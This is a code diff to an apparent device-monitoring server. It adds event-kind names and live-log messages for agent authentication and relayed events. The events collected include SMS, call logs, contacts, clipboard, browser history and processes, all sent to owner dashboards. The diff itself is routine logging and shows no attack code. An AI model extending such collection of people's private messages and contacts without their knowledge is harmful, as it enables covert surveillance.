@@ -59,6 +59,24 @@ function relayJsonToOwner(userId, packet) {
     sendToOwnerDashboards(registry, userId, packet);
 }
 
+function getEventKindName(kind) {
+    switch (kind) {
+        case EventKind.BROWSER_HISTORY: return 'BROWSER_HISTORY';
+        case EventKind.APP_HISTORY: return 'APP_HISTORY';
+        case EventKind.NOTIFICATION: return 'NOTIFICATION';
+        case EventKind.ACTIVITY: return 'ACTIVITY';
+        case EventKind.CLIPBOARD: return 'CLIPBOARD';
+        case EventKind.USB: return 'USB';
+        case EventKind.PROCESS: return 'PROCESS';
+        case EventKind.DEVICE_STATUS: return 'DEVICE_STATUS';
+        case EventKind.WINDOW: return 'WINDOW';
+        case EventKind.CALL_LOG: return 'CALL_LOG';
+        case EventKind.SMS: return 'SMS';
+        case EventKind.CONTACTS: return 'CONTACTS';
+        default: return `KIND_${kind}`;
+    }
+}
+
 async function handleAuth(socket, seq, payload) {
     const body = tryParseJson(payload) || {};
     const deviceId = String(body.deviceId || '').trim();
@@ -116,9 +134,16 @@ async function handleAuth(socket, seq, payload) {
         try {
             const liveLogBus = require('../services/liveLogBus');
             liveLogBus.push({
-                channel: 'tcp',
+                channel: 'agent',
                 level: 'info',
-                message: `agent media AUTH_OK ${deviceId} (${channel})`,
+                message: `[AGENT:RECV:TCP] Agent media auth: device ${deviceId} (${channel})`,
+                deviceId,
+                userId: String(credential.userId),
+            });
+            liveLogBus.push({
+                channel: 'node',
+                level: 'ok',
+                message: `[NODE:REACT] Agent media AUTH_OK: device ${deviceId} (${channel})`,
                 deviceId,
                 userId: String(credential.userId),
             });
@@ -179,9 +204,16 @@ async function handleAuth(socket, seq, payload) {
     try {
         const liveLogBus = require('../services/liveLogBus');
         liveLogBus.push({
-            channel: 'tcp',
+            channel: 'agent',
             level: 'info',
-            message: `agent AUTH_OK ${deviceId}`,
+            message: `[AGENT:RECV:TCP] Agent auth: device ${deviceId} (control)`,
+            deviceId,
+            userId: socket.controlAuth.userId,
+        });
+        liveLogBus.push({
+            channel: 'node',
+            level: 'ok',
+            message: `[NODE:REACT] Agent TCP AUTH_OK: device ${deviceId}`,
             deviceId,
             userId: socket.controlAuth.userId,
         });
@@ -211,6 +243,27 @@ function handleEvent(socket, seq, payload) {
     const kind = Number(body.kind || 0);
     const items = Array.isArray(body.items) ? body.items : (body.item ? [body.item] : []);
     const cursor = body.cursor;
+    const kindName = getEventKindName(kind);
+
+    try {
+        const liveLogBus = require('../services/liveLogBus');
+        liveLogBus.push({
+            channel: 'agent',
+            level: 'info',
+            message: `[AGENT:RECV:TCP] Event from ${auth.deviceId}: ${kindName} (${items.length} items)`,
+            deviceId: auth.deviceId,
+            userId: auth.userId,
+            meta: { kind: kindName, count: items.length }
+        });
+        liveLogBus.push({
+            channel: 'node',
+            level: 'info',
+            message: `[NODE:REACT] Relayed TCP event ${kindName} (+${items.length} items) for device ${auth.deviceId} to dashboard`,
+            deviceId: auth.deviceId,
+            userId: auth.userId,
+            meta: { kind: kindName, count: items.length }
+        });
+    } catch (_) {}
 
     // Immediate dashboard fan-out — never wait for Mongo.
     if (kind === EventKind.BROWSER_HISTORY) {
